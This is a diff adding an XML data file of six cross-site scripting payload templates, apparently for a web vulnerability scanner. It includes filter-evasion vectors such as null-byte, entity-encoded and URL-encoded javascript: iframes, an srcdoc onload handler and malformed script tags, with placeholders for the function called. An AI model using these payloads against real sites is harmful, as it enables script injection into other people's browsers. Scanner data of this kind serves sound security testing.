@@ -1,0 +1,47 @@
+<?xml version="1.0" encoding="utf-8" standalone="no" ?>
+<!DOCTYPE root [
+        <!ELEMENT root (fully+)>
+        <!ELEMENT fully (context | type | payload | decode)+>
+        <!ELEMENT context (#PCDATA)>
+        <!ELEMENT type (#PCDATA)>
+        <!ELEMENT payload (#PCDATA)>
+        <!ELEMENT decode (#PCDATA)>
+        ]>
+<root>
+    <fully>
+        <context>1,2,3,4,5</context>
+        <type>2</type>
+        <payload>&lt;IMG """&gt;&lt;SCRIPT&gt;?("$")&lt;/SCRIPT&gt;"&gt;</payload>
+        <decode>0</decode>
+    </fully>
+    <fully>
+        <context>1,2,3,4,5</context>
+        <type>2</type>
+        <payload>&lt;iframe src="data:text/html,%3C%73%63%72%69%70%74%3E?%28$%29%3C%2F%73%63%72%69%70%74%3E"&gt;&lt;/iframe&gt;</payload>
+        <decode>url</decode>
+    </fully>
+    <fully>
+        <context>1,2,3,4,5</context>
+        <type>2</type>
+        <payload>&lt;iframe %00 src="javascript:?($)"%00&gt;</payload>
+        <decode>0</decode>
+    </fully>
+    <fully>
+        <context>1,2,3,4,5</context>
+        <type>2</type>
+        <payload>&lt;iframe src=javascript&amp;colon;?&amp;lpar;$&amp;rpar;&gt;</payload>
+        <decode>0</decode>
+    </fully>
+    <fully>
+        <context>1,2,3,4,5</context>
+        <type>2</type>
+        <payload>&lt;iframe srcdoc='&lt;body onload=?&amp;lpar;$&amp;rpar;&gt;</payload>
+        <decode>0</decode>
+    </fully>
+    <fully>
+        <context>1,2,3,4,5</context>
+        <type>2</type>
+        <payload>&lt;script ~~~&gt;?($)&lt;/script ~~~'&gt;</payload>
+        <decode>0</decode>
+    </fully>
+</root>
